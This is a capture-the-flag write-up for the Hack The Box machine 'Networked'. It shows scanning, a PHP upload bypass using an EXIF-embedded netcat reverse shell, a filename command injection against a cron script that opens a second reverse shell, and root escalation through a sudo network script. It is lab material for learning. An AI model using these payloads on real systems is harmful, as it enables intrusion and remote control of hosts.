# NETWORKED

## ENUMERATION

Nmap scan gives us two open ports 

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/networked]
└─$ nmap 10.10.10.146
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-12 03:37 EDT
Nmap scan report for 10.10.10.146
Host is up (0.32s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE
22/tcp  open   ssh
80/tcp  open   http
443/tcp closed https

Nmap done: 1 IP address (1 host up) scanned in 18.63 seconds
                                                                                          
┌──(kali㉿kali)-[~/Downloads/hackthebox/networked]
└─$ nmap 10.10.10.146 -p 22,80,443 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-12 03:37 EDT
Nmap scan report for 10.10.10.146
Host is up (0.69s latency).

PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.43 seconds
```

Running the gobuster I find two directories which can be useful

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/networked]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.146 -t 100 -q
/.htaccess            (Status: 403) [Size: 211]
/.htpasswd            (Status: 403) [Size: 211]
/.hta                 (Status: 403) [Size: 206]
/backup               (Status: 301) [Size: 235] [--> http://10.10.10.146/backup/]
/cgi-bin/             (Status: 403) [Size: 210]                                  
/index.php            (Status: 200) [Size: 229]                                  
/uploads              (Status: 301) [Size: 236] [--> http://10.10.10.146/uploads/]
```

First I open the ```uploads``` directory but it is empty

Checking out the ```backup``` directory I find a ```backup.tar``` file

![](https://github.com/Leo-2807/Writeups/blob/main/images/networked1.png)

I download the file and open it

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/networked]
└─$ la
backup.tar
                                                                                          
┌──(kali㉿kali)-[~/Downloads/hackthebox/networked]
└─$ tar xf backup.tar
                                                                                          
┌──(kali㉿kali)-[~/Downloads/hackthebox/networked]
└─$ la
backup.tar  index.php  lib.php  photos.php  upload.php
```

I opened ```index.php``` 

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/networked]
└─$ cat index.php
<html>
<body>
Hello mate, we're building the new FaceMash!</br>
Help by funding us and be the new Tyler&Cameron!</br>
Join us at the pool party this Sat to get a glimpse
<!-- upload and gallery not yet linked -->
</body>
</html>
```
It is the source code of index.php page 
This gave me a hint that these other file can also be the source code of the respective pages
So I opened the ```/upload.php``` page on website 

![](https://github.com/Leo-2807/Writeups/blob/main/images/networked2.png)

## SHELL

Now as we read in the upload.php file we can only upload image files 

So I downloaded a image and injected php code into it to get a shell

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/networked]
└─$ exiftool -Comment='<?php system("nc 10.10.14.21 1234 -e /bin/bash"); ?>' shell.png
```

Now I tried uploading it . It worked 
I opened the photos.php page and opened my uploaded image 
It opened as a image and did not gave me a shell

So I tried changing the extension to ```.php.png```

And this time around I successfully got a shell

## USER

Now checking the home directory of user guly

```
bash-4.2$ ls
ls
check_attack.php  crontab.guly  user.txt
bash-4.2$ cat crontab.guly
cat crontab.guly
*/3 * * * * php /home/guly/check_attack.php
```

So this file is executing check_attack.php every 3 minutes

```php
bash-4.2$ cat check_attack.php    
cat check_attack.php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```

So this script is deleting files from path which are not supposed to be there
```exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");``` In this line the path is ```/var/www/html/uploads``` and the value is filename
That means we can inject a command as the filename 

Now we can just go to the path i.e. ```/var/www/html/uploads``` use touch command to make a file which holds the shell command as it's name

```
bash-4.2$ cd /var/www/html/uploads
cd /var/www/html/uploads
bash-4.2$ touch '; nc 10.10.14.21 8888 -c bash'
touch '; nc 10.10.14.21 8888 -c bash'
```

We start nc listner on our machine and in 3 minutes we get a user shell

## ROOT

Checking sudo permissions

```
guly@networked ~]$ sudo -l
sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

So we can run a bash script

```bash
[guly@networked ~]$ cat /usr/local/sbin/changename.sh
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done

/sbin/ifup guly0
```

I tried doing to search for vulnerbilities in  ```/etc/sysconfig/network-scripts/ifcfg-guly``` file and came across [this page](/etc/sysconfig/network-scripts/ifcfg-guly)

This says that whatever we write after a blank space in the name attribute will be executed as root


```
[guly@networked sbin]$ sudo /usr/local/sbin/changename.sh
sudo /usr/local/sbin/changename.sh
interface NAME:
test bash
test bash
interface PROXY_METHOD:
test
test
interface BROWSER_ONLY:
sdvefv
sdvefv
interface BOOTPROTO:
dfvv
dfvv
[root@networked network-scripts]# whoami
whoami
root
```

